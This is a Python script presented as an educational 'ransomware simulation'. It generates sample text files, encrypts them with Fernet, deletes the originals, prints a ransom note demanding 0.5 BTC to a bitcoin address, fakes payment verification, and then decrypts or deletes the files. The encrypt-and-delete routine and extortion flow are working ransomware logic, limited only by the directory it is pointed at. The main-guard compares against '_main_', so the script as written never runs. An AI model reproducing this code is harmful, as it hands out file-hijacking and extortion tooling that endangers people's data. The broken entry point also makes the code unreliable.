import os
import time
import json
import glob
from cryptography.fernet import Fernet

def print_header(text):
    print("\n" + "=" * 70)
    print(text.center(70))
    print("=" * 70 + "\n")

def create_test_files(directory, num_files=5):
    if not os.path.exists(directory):
        os.makedirs(directory)
    
    files_created = 0
    for i in range(num_files):
        file_path = os.path.join(directory, f"file_{i}.txt")
        with open(file_path, "w") as f:
            f.write(f"This is test file {i} with important content.\n")
            f.write("Lorem ipsum dolor sit amet, consectetur adipiscing elit.\n")
        files_created += 1
        print(f"Created: {file_path}")
    
    return files_created

def encrypt_files(directory):
    key = Fernet.generate_key()
    cipher = Fernet(key)
    
    files = glob.glob(os.path.join(directory, "*.txt"))
    
    encrypted_files = []
    for file_path in files:
        try:
            with open(file_path, "rb") as f:
                data = f.read()
            
            encrypted_data = cipher.encrypt(data)
            
            encrypted_path = file_path + ".encrypted"
            with open(encrypted_path, "wb") as f:
                f.write(encrypted_data)
            
            os.remove(file_path)
            
            encrypted_files.append({"original": file_path, "encrypted": encrypted_path})
            print(f"Encrypted: {file_path}")
            
        except Exception as e:
            print(f"Error encrypting {file_path}: {e}")
    
    with open("key.json", "w") as f:
        json.dump({"key": key.decode(), "files": encrypted_files}, f)
    
    return len(encrypted_files)

def decrypt_files():
    """Decrypt all encrypted files"""
    try:
        with open("key.json", "r") as f:
            data = json.load(f)
        
        key = data["key"].encode()
        files = data["files"]
        
        cipher = Fernet(key)
        
        for file_info in files:
            try:
                with open(file_info["encrypted"], "rb") as f:
                    encrypted_data = f.read()
                
                decrypted_data = cipher.decrypt(encrypted_data)
                
                with open(file_info["original"], "wb") as f:
                    f.write(decrypted_data)
                
                os.remove(file_info["encrypted"])
                
                print(f"Decrypted: {file_info['original']}")
                
            except Exception as e:
                print(f"Error decrypting {file_info['encrypted']}: {e}")
        
        os.remove("key.json")
        return len(files)
        
    except Exception as e:
        print(f"Error loading key file: {e}")
        return 0

def delete_files():
    """Delete encrypted files and encryption key"""
    try:
        with open("key.json", "r") as f:
            data = json.load(f)
        
        files = data["files"]
        
        for file_info in files:
            try:
                os.remove(file_info["encrypted"])
                print(f"Deleted: {file_info['encrypted']}")
            except Exception as e:
                print(f"Error deleting {file_info['encrypted']}: {e}")
        
        os.remove("key.json")
        return len(files)
        
    except Exception as e:
        print(f"Error loading key file: {e}")
        return 0

def main_menu():
    """Display main menu and handle user input"""
    test_dir = "test_files"
    
    while True:
        print_header("SCRIBBLE RANSOMWARE SIMULATION")
        print("1. Create test files")
        print("2. Encrypt files")
        print("3. Pay ransom (simulate)")
        print("4. Decrypt files")
        print("5. Delete files (simulate deadline expiration)")
        print("6. Exit")
        
        choice = input("\nEnter your choice (1-6): ")
        
        if choice == "1":
            num = create_test_files(test_dir)
            print(f"\nCreated {num} test files in '{test_dir}' directory.")
            input("\nPress Enter to continue...")
            
        elif choice == "2":
            if not os.path.exists(test_dir) or not os.listdir(test_dir):
                print("\nNo test files found. Please create test files first.")
            else:
                num = encrypt_files(test_dir)
                print(f"\nEncrypted {num} files.")
                
                print_header("YOUR FILES HAVE BEEN ENCRYPTED!")
                print("All your important files have been encrypted with strong encryption.")
                print("To recover your files, you must pay 0.5 BTC to the following address:")
                print("\nbc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh\n")
                print("After payment, use option 3 to verify your payment.")
                print("WARNING: If you do not pay within 24 hours, your files will be deleted!")
            
            input("\nPress Enter to continue...")
            
        elif choice == "3":
            print("\nVerifying payment...")
            time.sleep(2)
            print("Payment verified successfully!")
            print("You can now decrypt your files using option 4.")
            input("\nPress Enter to continue...")
            
        elif choice == "4":
            if not os.path.exists("key.json"):
                print("\nNo encrypted files found or payment not verified.")
            else:
                num = decrypt_files()
                print(f"\nDecrypted {num} files successfully!")
            
            input("\nPress Enter to continue...")
            
        elif choice == "5":
            if not os.path.exists("key.json"):
                print("\nNo encrypted files found.")
            else:
                print("\nSimulating deadline expiration...")
                num = delete_files()
                print(f"\nDeleted {num} files permanently!")
                print("The encryption key has been destroyed!")
            
            input("\nPress Enter to continue...")
            
        elif choice == "6":
            print("\nExiting Scribble Ransomware Simulation.")
            break
            
        else:
            print("\nInvalid choice. Please try again.")
            input("\nPress Enter to continue...")

if __name__ == "_main_":
    print("Starting Scribble Ransomware Simulation...")
    print("WARNING: This is for educational purposes only.")
    main_menu()